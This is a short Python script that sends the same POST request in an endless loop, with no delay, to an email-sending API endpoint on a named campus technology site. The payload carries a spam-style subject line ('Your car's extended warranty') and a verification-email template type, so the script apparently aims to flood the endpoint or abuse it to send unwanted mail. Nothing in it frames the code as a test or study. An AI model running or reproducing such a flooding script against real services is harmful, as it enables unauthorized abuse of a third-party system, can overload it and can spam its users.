import requests
import json

url = "https://campustech.org/api/2.0/contacts/send/email/user"
headers = {

}
payload = {
    "subject": "Your car's extended warranty",
    "type": "verificationCodeEmailConfigs",
    "emailTo": [""],
    "fields": {"[submitter_name]": "weee"},
    "entry_id": "d9855890-e4cd-4aa8-9173-e7281df22a40"
}



while(True): 
  response = requests.post(url, headers=headers, data=json.dumps(payload))
  print(response.status_code)
  print(response.text)
